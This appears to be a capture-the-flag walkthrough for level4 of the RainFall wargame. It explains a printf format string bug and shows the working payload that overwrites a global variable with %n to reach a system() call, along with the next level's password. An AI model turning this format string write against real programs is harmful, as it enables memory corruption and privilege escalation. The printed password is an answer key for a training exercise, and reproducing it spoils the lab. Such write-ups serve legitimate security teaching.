# Level4

As in level3, we can find an executable waiting for an input, print it and quit after press enter
```
level4@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
level4@RainFall:~$ ./level4
bla
bla
level4@RainFall:~$
```
After analyze it with gdb we can see that the `main()` function call a function named `n()` who also call a function named `p()`. Apart from that the binary is almost the same as the level3.  
Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-RainFall/blob/main/level4/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-RainFall/blob/main/level4/source.c) for more details.  
<br/>

The `main()` only call `n()`, not very interesting so we can skip it.  
We can see a call to `fgets()`, in `n()`, wich is protect against buffer overflow attack.
```
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
```
After that we can see a call to `printf()` function, in `p()` wich is vulnerable to format string exploit!
```
   0x08048450 <+12>:    call   0x8048340 <printf@plt>
```
Then the program compares the value of a global variable `m` at `0x8049810` to 0x1025544 (16930116 in dec).  
If the comparaison return true the function will launch a shell via a call to `system()`.  
We need to manipulate `printf()` function into changing the value of the variable at the address `0x8049810`.   
First, as in [level3](https://github.com/maxisimo/42-RainFall/blob/main/level3/walkthrough.md) we need to print the memory until we reach the address of the variable we wish to modify, then change the content of the variable `m`.
```
level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
aaaa b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0
level4@RainFall:~$ python -c 'print "aaaa" + " %x" * 15' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
aaaa b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
level4@RainFall:~$
```
The buffer `aaaa` is at the 12th position (`61616161`) !  
The previous method can't work, cause the value `16930116` in the comparaison is too long. But with the modifier `%d`, we can dynamically specify the field width (like that : `%16930116d`).  
This will be the only difference between this level and the older one.  
Finally our final format string attack will look like :  
- address of `m` (4 bytes)
- pad of 16930112 (sub 4 bytes cause of `m`) with modifier `%d` + modifier `%n`
```
level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' > /tmp/exploit
level4@RainFall:~$ cat /tmp/exploit | ./level4
                                                                                     -1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
level4@RainFall:~$ su level5
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
level5@RainFall:~$
```
*For this level we didn't have to keep listening `stdin` cause the `system()` function made a "/bin/cat /home/user/level5/.pass"*
Level4 passed!
